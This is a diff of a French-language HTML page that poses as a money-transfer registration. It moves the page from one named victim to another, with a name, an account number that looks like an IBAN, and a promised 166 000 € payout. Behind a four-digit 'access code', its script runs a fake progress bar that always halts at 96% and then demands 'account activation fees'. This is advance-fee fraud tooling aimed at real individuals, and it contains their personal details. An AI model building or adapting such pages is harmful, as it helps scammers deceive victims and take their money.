@@ -6,26 +6,29 @@
     <title>Enregistrement Money</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            background-color: #f7f7f7;
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            background: url('https://cdn.pixabay.com/photo/2017/12/27/09/32/stability-3042271_1280.jpg') no-repeat center center/cover;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
+            color: #333;
         }
 
         .container, .form-container {
-            background-color: #fff;
+            background-color: rgba(255, 255, 255, 0.9);
             padding: 30px;
             border-radius: 10px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.2);
             max-width: 400px;
             width: 100%;
             text-align: center;
         }
 
         h1 {
-            color: #333;
+            color: #007bff;
             margin-bottom: 20px;
         }
 
@@ -38,6 +41,8 @@
             display: block;
             margin-bottom: 5px;
             font-size: 14px;
+            font-weight: bold;
+            color: #555;
         }
 
         input {
@@ -46,6 +51,12 @@
             font-size: 16px;
             border: 1px solid #ccc;
             border-radius: 5px;
+            transition: border-color 0.3s;
+        }
+
+        input:focus {
+            border-color: #007bff;
+            outline: none;
         }
 
         .amount {
@@ -65,7 +76,7 @@
         .progress-bar {
             width: 0;
             height: 20px;
-            background-color: #007bff;
+            background-color: #28a745;
             border-radius: 5px;
         }
 
@@ -83,7 +94,7 @@
         .progress-title {
             margin-top: 20px;
             font-size: 16px;
-            color: #007bff;
+            color: #28a745;
             font-weight: bold;
             display: none;
         }
@@ -119,13 +130,19 @@
         button:hover {
             background-color: #0056b3;
         }
+
+        @media (max-width: 600px) {
+            .container, .form-container {
+                padding: 20px;
+            }
+        }
     </style>
 </head>
 <body>
     <div class="container" id="accessContainer">
         <h1>Vérification du Code d'Accès</h1>
         <div class="form-group">
-            <label for="accessCode">Entrez les quatres derniers chiffres de votre numero</label>
+            <label for="accessCode">Entrez les quatre derniers chiffres de votre numéro de compte</label>
             <input type="password" id="accessCode" placeholder="Code d'accès" required>
         </div>
         <button onclick="checkAccessCode()">Valider</button>
@@ -138,17 +155,17 @@
         <form id="tmoneyForm" onsubmit="return false;">
             <div class="form-group">
                 <label for="name">Nom et Prénom</label>
-                <input type="text" id="name" value="Divine Faraja" disabled>
+                <input type="text" id="name" value="De Smidt Freddy" disabled>
             </div>
 
             <div class="form-group">
-                <label for="phone">Numéro </label>
-                    <input type="tel" id="phone" value="+243 085 647 8741" disabled>
+                <label for="phone">Numéro</label>
+                <input type="tel" id="phone" value="BE 39860107974419" disabled>
             </div>
 
             <div class="form-group">
                 <label for="amount">Montant à recevoir</label>
-                <input type="text" id="amount" class="amount" value="1 000 $" disabled>
+                <input type="text" id="amount" class="amount" value="166 000 €" disabled>
             </div>
 
             <button type="button" onclick="startProgress()">Procéder</button>
@@ -160,7 +177,7 @@
                 <div class="progress-bar" id="progressBar"></div>
             </div>
 
-            <div class="notification-message" id="notificationMessage">Erreur : Veuillez payer les frais de carte d'investisseur afin de terminer la transaction.</div>
+            <div class="notification-message" id="notificationMessage">Erreur : Veuillez payer les frais d'activation de compte afin de terminer la transaction.</div>
         </form>
     </div>
 
@@ -169,7 +186,7 @@
             const accessCode = document.getElementById('accessCode').value;
             const accessError = document.getElementById('accessError');
 
-            if (accessCode === "8741") {
+            if (accessCode === "4419") {
                 accessError.style.display = 'none';
                 document.getElementById('accessContainer').style.display = 'none';
                 document.getElementById('formContainer').style.display = 'block';
@@ -183,26 +200,25 @@
             document.getElementById('progressTitle').style.display = 'block';
             document.getElementById('notificationMessage').style.display = 'none';
 
-           let progress = 0; // Initial progress
-    const progressBar = document.getElementById('progressBar');
-    const progressPercentage = document.getElementById('progressPercentage');
-    
-    const totalTime = 2 * 60 * 1000; // 5 minutes in milliseconds
-    const maxProgress = 96; // Target percentage
-    const intervalTime = totalTime / maxProgress; // Time per percentage step
+            let progress = 0; // Initial progress
+            const progressBar = document.getElementById('progressBar');
+            const progressPercentage = document.getElementById('progressPercentage');
 
-    const interval = setInterval(() => {
-        if (progress < maxProgress) {
-            progress += 1; // Increment progress by 1%
-            progressBar.style.width = progress + '%';
-            progressPercentage.textContent = progress + '%';
-        } else {
-            clearInterval(interval);
-            // Keep the bar at 96% without increasing further
-            document.getElementById('notificationMessage').style.display = 'block';
+            const totalTime = 2 * 60 * 1000; // 2 minutes in milliseconds
+            const maxProgress = 96; // Target percentage
+            const intervalTime = totalTime / maxProgress; // Time per percentage step
+
+            const interval = setInterval(() => {
+                if (progress < maxProgress) {
+                    progress += 1; // Increment progress by 1%
+                    progressBar.style.width = progress + '%';
+                    progressPercentage.textContent = progress + '%';
+                } else {
+                    clearInterval(interval);
+                    document.getElementById('notificationMessage').style.display = 'block';
+                }
+            }, intervalTime);
         }
-    }, intervalTime);
-}
     </script>
 </body>
 </html>
